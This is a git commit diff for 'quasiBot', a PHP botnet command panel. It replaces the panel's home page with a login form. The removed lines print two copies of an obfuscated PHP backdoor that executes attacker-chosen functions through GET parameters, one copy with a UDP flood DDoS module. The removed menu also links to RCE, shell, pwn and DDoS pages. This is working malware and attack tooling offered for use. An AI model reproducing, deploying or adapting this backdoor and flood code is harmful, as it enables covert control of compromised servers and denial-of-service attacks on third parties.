e92bf0362fe864a99646d38fd357fffee755becd
Smaash <smash@devilteam.pl>
2014-08-07 17:43:28 +0200

    0.3

--- index.php
+++ index.php
@@ -1,7 +1,6 @@
 <?php
 
 require('config.php');
-auth();
 
 ?>
 
@@ -11,124 +10,48 @@ auth();
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-    <title>quasiBot | home</title>
+    <title>quasiBot | login</title>
     <link href="style.css" rel="stylesheet" type="text/css" media="screen" />
 </head>
 <body>
-<div id="wrapper">
-    <div id="header">
 
+<div id="page-login">
 
-        <div id="logo">
-            <h1><a href="index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>
+<div class="post">
+<h2 class="title"><center>Login area</center></h2>
+<div class="entry">
+<form method="post">
+<p class="meta"></p>
+<center>
+<p>Name - <input type="text" name="username" style="width: 150px;"></p>
+<p>Pass - &nbsp;<input type="password" name="password" style="width: 150px;"></p>
+<input type="submit" value="Login">
+</center>
+</form>
 
 <?php
-quotes();
+
+if(AUTH_ENABLE == 1) {
+
+session_start();
+
+if(isset($_POST['username']) && isset($_POST['password'])) {
+	if($_POST['username'] == AUTH_USER && md5($_POST['password']) == AUTH_PASS) {
+		$_SESSION['user'] = $_POST['username'];
+		header('Location: home/index.php');
+	} else {
+		echo '<br /><center><p>Incorred user or password</p></center>';
+	}
+}
+} else {
+	header('Location: home/index.php');
+}
+
 ?>
 
-        </div>
-    </div>
-    <div id="menu">
-        <ul>
-            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
-            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
-            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
-            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
-            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
-            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com/') ?></li>
-        </ul>
-    </div>
-    <div id="page">
-        <div id="page-bgtop">
-            <div id="page-bgbtm">
-                <div id="content">
-
-                    <div class="post">
-                        <h2 class="title"><a href="#">Bots</a></h2>
-                        <div class="entry">
-                            <p class="meta"> 
-                        <?php
-                        checkbots();
-						?>
-                            </p>
-                        </div>
-                    </div> 
-                    <div class="post">
-                        <h2 class="title"><a href="#">Backdoor</a></h2>
-                        <div class="entry">
-                            <p class="meta"> 
-                            Current PHP backdoor source code
-                            </p>
-<pre>
-if($_GET['_']) {
-print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
-print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
-} elseif($_GET['___']) { @$_GET['___'](); }
-</pre>
-
-
-                        </div>
-                    </div>
-                    <div class="post">
-                        <h2 class="title"><a href="#">Backdoor w/ ddos</a></h2>
-                        <div class="entry">
-                            <p class="meta"> 
-                            Current PHP backdoor with source code, ddos module included (not necessary)
-                            </p>
-<pre width="30">
-if($_GET['_']) {
-print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
-print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
-} elseif($_GET['___']) { @$_GET['___'](); } elseif(isset($_POST['target'])&&isset($_POST['time'])){$fn0=0;$pm1=$_POST['time'];$yu2=time();$az3=$yu2+$pm1;$jd4=$_POST['target'];$kb5=gethostbyname($jd4);for($pt6=0;$pt6<65553;$pt6++){$yf7.='X';}while(1){$fn0++;if(time()>$az3){break;}$yw8=rand(1,65553);$vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);if($vl9){fwrite($vl9,$yf7);fclose($vl9);}}}elseif($_POST['kill']=='1'){exit(0);}
-</pre>
-
-
-                        </div>
-                    </div>
-                    <div style="clear: both;">&nbsp;</div>
-                </div>
-                <!-- end #content -->
-                <div id="sidebar">
-                    <ul>
-                        <li>
-                            <h2>Home</h2>
-                            <ul>
-                                <li><a href="index.php"><b>Index</b></a></li>
-                                <li><a href="settings.php">Settings</a></li>
-                                <li><a href="rss.php">RSS</a></li>
-                            </ul>
-                        </li>
-                        <li>
-                           <h2>Hack</h2>
-                            <ul>
-                                <li><a href="rce.php">RCE</a></li>
-                                <li><a href="scan.php">Scan</a></li>
-                                <li><a href="pwn.php">Pwn</a></li>
-                                <li><a href="shell.php">Shell</a></li>
-                            </ul>
-                        </li>
-                        <li>
-                           <h2>Tools</h2>
-                            <ul>
-                                <li><a href="sql.php">MySQL Manager</a></li>
-                                <li><a href="https://github.com/Smaash/hostscan/">HostScan</a></li>
-                             </ul>
-                        </li>
-                        <li>
-                           <h2>Bots</h2>
-                            <ul>
-                                <li><a href="ddos.php">DDoS</a></li>
-                                <li><a href="more.php">Run</a></li>
-                             </ul>
-                        </li>
-                </div>
-                <div style="clear: both;">&nbsp;</div>
-            </div>
-        </div>
-    </div>
 </div>
-<div id="footer">
-    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
+
 </div>
+</div>
+
 </body>
-</html>
